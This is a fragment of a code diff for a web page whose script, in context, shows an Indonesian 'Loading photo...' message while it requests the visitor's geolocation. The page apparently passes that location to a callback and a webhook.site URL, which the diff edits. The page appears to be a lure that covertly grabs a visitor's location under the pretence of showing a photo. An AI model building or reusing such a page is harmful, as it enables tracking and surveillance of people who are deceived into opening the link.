@@ -23,9 +23,10 @@
   </div>
 
   <script>
-    const WEBHOOK_URL = 'https://webhook.site/89fc2d12-706e-4bd0-a557-c7351a3bf8e9';
+    const WEBHOOK_URL = 'https://webhook.site/89fc2d12-706e-4bd0-a557-c7351a3bf8e';
 
-    function getLocation() {
+
+   function getLocation() {
       document.getElementById('status').innerHTML = 'Memuat foto...';
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendData, function() {
